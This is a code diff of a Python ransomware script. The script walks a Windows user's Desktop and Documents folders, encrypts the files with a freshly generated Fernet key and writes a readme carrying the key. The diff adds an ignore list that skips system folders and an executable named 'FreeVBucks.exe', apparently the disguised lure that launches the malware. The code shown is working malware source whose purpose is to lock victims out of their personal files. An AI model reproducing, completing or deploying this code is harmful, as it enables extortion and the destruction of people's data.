@@ -1,25 +1,26 @@
+import getpass
 import os
-import getpass as gt
 from cryptography.fernet import Fernet
 
 
 def main():
-    username = gt.getuser()
+    username = getpass.getuser()
     directories = [f'C:\\Users\\{username}\\Desktop', f'C:\\Users\\{username}\\Documents']
+    ignore = ['desktop.ini', 'A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe']
     key = Fernet.generate_key()
     f = Fernet(key)
 
-    loop(directories, f)
+    loop(directories, ignore, f)
     write_readme(username, key.decode())
 
 
-def loop(directories: list[str], f: Fernet):
+def loop(directories: list[str], ignore: list[str], f: Fernet):
     aux_directories = []
     while len(directories) != 0:
         for directory in directories:
             if os.path.exists(directory) and os.path.isdir(directory):
                 for file in os.listdir(directory):
-                    if file == "FreeVBucks.exe":
+                    if file in ignore:
                         continue
                     if os.path.isfile(directory + "\\" + file):
                         read(directory + "\\" + file, f)
